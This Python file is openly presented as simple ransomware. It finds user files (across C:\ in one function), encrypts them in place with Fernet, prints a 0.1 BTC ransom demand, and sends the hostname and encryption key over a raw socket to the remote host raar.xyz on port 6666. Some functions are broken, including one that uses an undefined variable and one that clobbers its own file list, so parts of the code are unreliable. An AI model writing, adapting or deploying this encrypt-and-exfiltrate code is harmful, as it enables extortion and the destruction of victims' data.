""" Implementation of simple ransomware in Python.
"""

import logging
import os
import sys
from cryptography.fernet import Fernet
import socket
import datetime


class Ransomware:
    """ This class represents file encrypting ransomware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def key(self):
        """ Name of the malware. """
        return self._key

    @property
    def gen_key(self):
        """ Key used for encryption of data. """
        key = Fernet.generate_key()
        self._key = key
        return self._key

    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ").encode()

    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print(
            "Hi, all your files has been encrypted. Please "
            "send 0.1 BTC on this address to get decryption"
        )

    def decrypt_file(self, key, filename):
        """ Decrypt the given file with AES encryption algoritm.
        :param str key: Decryption key.
        :param str filename: Name of the file.
        """
        decrypted = Fernet(key).decrypt(contents)

    def get_files_in_folder(self, path):
        """ Returns a `list` of all files in the folder.
        :param str path: Path to the folder
        """
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository and this file.
            if file == 'README.md' or file == sys.argv[0]:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files
    def get_all_files(self):
        files = [] #All files with the specified extension
        encrypted_ext = ('.txt','docx','png','jpg')
        for root, dirs, files in os.walk('C:\\'):
            for file in files:
                files, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in encrypted_ext:
                    files.append(root+'\\'+file)
        return files

    def encrypt_files_in_PC(self,key):
        """ Encrypt all files in the infectedPC
        :returns: Number of encrypted files (`int`).
        """
        num_encrypted_files = 0
        files = self.get_all_files()
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
                num_encrypted_files += 1
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
                self.ransom_user()

        return num_encrypted_files

    def encrypt_files_in_folder(self, key, path):
        """ Encrypt all files in the infectedPC
        :returns: Number of encrypted files (`int`).
        """
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
                num_encrypted_files += 1
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
                self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        """ Decrypt all files in the given directory specified
        by path.
        :param str path: Path of the folder to be decrypted.
        """
        num_decrypted_files = 0
        # Obtain a key from the user.
        key = self.obtain_key()
        if key != self.key:
            print('Wrong key!')
            return

        files = self.get_files_in_folder(path)

        # Decrypt each file in the directory.
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
                contents_decrypted = Fernet(key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
                num_decrypted_files += 1

        return num_decrypted_files

def send_key(hostname, key):

    flag = False
    #Conectarse a servidor de ransomware para enviar nombre del host y llave
    ip_address = 'raar.xyz' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
    port = 6666
    ttime = datetime.datetime.now()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_address, port))
        s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))
    flag = True

    return flag

if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create ransomware.
    ransomware = Ransomware('SimpleRansomware')

    #Find all specified files
    files = ransomware.get_files_in_folder('Test')

    #Generate key
    key = ransomware.gen_key
    with open("thekey.key","wb") as thekey: #Key file in just to be sure we have the key, in real case scenarios this won't exist
            thekey.write(key)

    path = 'Cifrado'

    # Encrypt files located in the given directory
    number_encrypted_files = ransomware.encrypt_files_in_folder(key, path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    hostname = socket.gethostname()
    send_key(hostname, key)

    # Decrypt files located in the given directory
    number_decrypted_files = ransomware.decrypt_files_in_folder(path)
    print('Number of decrypted files: {}'.format(number_decrypted_files))
